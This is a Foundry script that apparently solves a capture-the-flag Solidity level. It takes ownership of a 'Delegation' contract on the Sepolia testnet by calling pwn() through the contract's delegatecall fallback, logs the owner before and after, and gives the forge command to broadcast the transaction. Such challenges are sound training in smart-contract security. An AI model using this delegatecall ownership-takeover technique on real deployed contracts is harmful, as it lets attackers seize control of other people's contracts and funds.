// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level6Delegation.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

// Objective: claim ownership of the instance you are given.

contract Level6Solution is Script {
    Delegation public delegation =
        Delegation(0x231AE16eed42fa6cFE0F4cF21dF1D97cb1ab8701);

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        console.log("Current owner:", delegation.owner());
        address(delegation).call(abi.encodeWithSignature("pwn()"));
        console.log("New owner:", delegation.owner());

        vm.stopBroadcast();
    }
}
// forge script script/Level6Solution.s.sol:Level6Solution --broadcast -vvvv --rpc-url sepolia --etherscan-api-key "${ETHERSCAN_API_KEY}"
